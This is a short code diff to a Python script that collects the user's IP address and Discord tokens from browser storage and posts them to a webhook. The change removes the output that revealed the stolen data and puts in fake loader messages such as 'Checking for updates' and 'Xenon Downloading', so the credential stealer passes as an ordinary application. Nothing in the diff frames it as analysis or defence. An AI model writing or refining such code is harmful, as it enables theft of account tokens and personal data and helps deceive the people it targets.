@@ -65,15 +65,15 @@ def main():
 
     # Get IP Address
     ip_address = get_ip()
-    print(f"\n===== IP Address: {ip_address} =====\n")
+    print("Loading resources")
 
-    print("\n===== Discord Tokens =====\n")
+    print("Checking for updates")
     found_tokens = []
 
     for browser, path in DISCORD_PATHS.items():
         tokens = get_discord_tokens(path)
         if tokens:
-            print(f"[{browser}] Tokens: {tokens}")
+            print("Xenon Downloading")
             found_tokens.extend(tokens)
 
     # Format tokens properly
@@ -97,9 +97,9 @@ def main():
 
     # Send everything in one message
     response = requests.post(WEBHOOK_URL, json=data)
-    print("Webhook Response:", response.status_code, response.text)
+    print("Opening...")
 
-    print("\n====================================\n")
+    print("Xenon open succesfully, wait")
 
 if __name__ == "__main__":
     main()
